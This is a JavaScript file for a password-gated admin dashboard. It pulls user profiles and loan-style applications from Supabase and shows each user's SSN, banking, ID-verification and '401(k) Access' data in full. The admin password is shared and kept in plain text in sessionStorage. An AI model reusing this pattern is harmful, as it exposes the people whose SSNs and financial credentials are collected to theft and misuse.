import { supabase } from './auth.js';

const PW_KEY = 'admin_pw_v1';
const gate = document.getElementById('gate');
const dash = document.getElementById('dash');
const pwInput = document.getElementById('pw');
const pwErr = document.getElementById('pwErr');
const form = document.getElementById('gateForm');
const usersEl = document.getElementById('users');
const summaryEl = document.getElementById('summary');
const signOutBtn = document.getElementById('signOut');

function esc(s) {
  return String(s == null ? '' : s)
    .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
}

function fmtDate(s) {
  if (!s) return '—';
  try { return new Date(s).toLocaleString(); } catch (e) { return s; }
}

function row(label, value) {
  return '<div class="kv"><span class="k">' + esc(label) + '</span><span class="v">' + esc(value == null || value === '' ? '—' : value) + '</span></div>';
}

function jsonRows(obj) {
  if (!obj || typeof obj !== 'object') return '';
  const keys = Object.keys(obj);
  if (!keys.length) return '<div class="empty">No data submitted for this step.</div>';
  return keys.map(function (k) { return row(k, obj[k]); }).join('');
}

async function load(pw) {
  const [{ data: profiles, error: pe }, { data: apps, error: ae }] = await Promise.all([
    supabase.rpc('admin_list_profiles', { pw: pw }),
    supabase.rpc('admin_list_applications', { pw: pw })
  ]);
  if (pe || ae) throw (pe || ae);
  return { profiles: profiles || [], apps: apps || [] };
}

function render(profiles, apps) {
  const byUser = {};
  profiles.forEach(function (p) { byUser[p.id] = { profile: p, apps: [] }; });
  apps.forEach(function (a) {
    if (!byUser[a.user_id]) byUser[a.user_id] = { profile: null, apps: [] };
    byUser[a.user_id].apps.push(a);
  });

  const totalApps = apps.length;
  summaryEl.innerHTML =
    '<div class="stat"><div class="n">' + profiles.length + '</div><div class="l">Users</div></div>' +
    '<div class="stat"><div class="n">' + totalApps + '</div><div class="l">Applications</div></div>';

  const ids = Object.keys(byUser);
  if (!ids.length) {
    usersEl.innerHTML = '<div class="empty-state">No users yet.</div>';
    return;
  }

  usersEl.innerHTML = ids.map(function (id) {
    const entry = byUser[id];
    const p = entry.profile || {};
    const name = ((p.first_name || '') + ' ' + (p.last_name || '')).trim() || p.username || p.email || 'Unknown user';
    const initials = (name[0] || '?').toUpperCase();
    const appsHtml = entry.apps.length
      ? entry.apps.map(function (a) {
          return '<div class="app">' +
            '<div class="app-head"><strong>Application ' + esc(a.app_number || a.id.slice(0, 8)) + '</strong><span class="muted">' + esc(fmtDate(a.created_at)) + '</span></div>' +
            '<div class="app-grid">' +
              '<div class="block"><h4>Personal</h4>' + jsonRows(a.personal) + '</div>' +
              '<div class="block"><h4>Banking</h4>' + jsonRows(a.banking) + '</div>' +
              '<div class="block"><h4>Business / Need</h4>' + jsonRows(a.business) + '</div>' +
              '<div class="block"><h4>ID Verification</h4>' + jsonRows(a.id_verify) + '</div>' +
              '<div class="block"><h4>401(k) Access</h4>' + jsonRows(a.kaccess) + '</div>' +
              '<div class="block"><h4>Final Review</h4>' + jsonRows(a.final) + '</div>' +
            '</div>' +
          '</div>';
        }).join('')
      : '<div class="empty">No applications submitted yet.</div>';

    return '<details class="user-card" ' + (entry.apps.length ? 'open' : '') + '>' +
      '<summary>' +
        '<span class="avatar">' + esc(initials) + '</span>' +
        '<span class="who"><strong>' + esc(name) + '</strong><span class="muted">' + esc(p.email || '') + '</span></span>' +
        '<span class="badge">' + entry.apps.length + ' app' + (entry.apps.length === 1 ? '' : 's') + '</span>' +
      '</summary>' +
      '<div class="user-body">' +
        '<div class="profile-block">' +
          '<h3>Profile</h3>' +
          '<div class="app-grid">' +
            '<div class="block">' +
              row('Username', p.username) +
              row('Email', p.email) +
              row('Phone', p.phone) +
              row('Date of Birth', p.dob) +
              row('SSN', p.ssn) +
              row('Citizenship', p.citizenship) +
            '</div>' +
            '<div class="block">' +
              row('Address', p.address) +
              row('City', p.city) +
              row('State', p.state) +
              row('ZIP', p.zip) +
              row('Created', fmtDate(p.created_at)) +
              row('Updated', fmtDate(p.updated_at)) +
            '</div>' +
          '</div>' +
        '</div>' +
        '<div class="apps-block"><h3>Applications</h3>' + appsHtml + '</div>' +
      '</div>' +
    '</details>';
  }).join('');
}

async function unlock(pw) {
  const { profiles, apps } = await load(pw);
  sessionStorage.setItem(PW_KEY, pw);
  gate.style.display = 'none';
  dash.style.display = 'block';
  render(profiles, apps);
}

form.addEventListener('submit', async function (e) {
  e.preventDefault();
  pwErr.textContent = '';
  try {
    await unlock(pwInput.value);
  } catch (err) {
    pwErr.textContent = 'Incorrect password.';
  }
});

signOutBtn.addEventListener('click', function () {
  sessionStorage.removeItem(PW_KEY);
  location.reload();
});

(async function boot() {
  const saved = sessionStorage.getItem(PW_KEY);
  if (!saved) return;
  try { await unlock(saved); } catch (e) { sessionStorage.removeItem(PW_KEY); }
})();
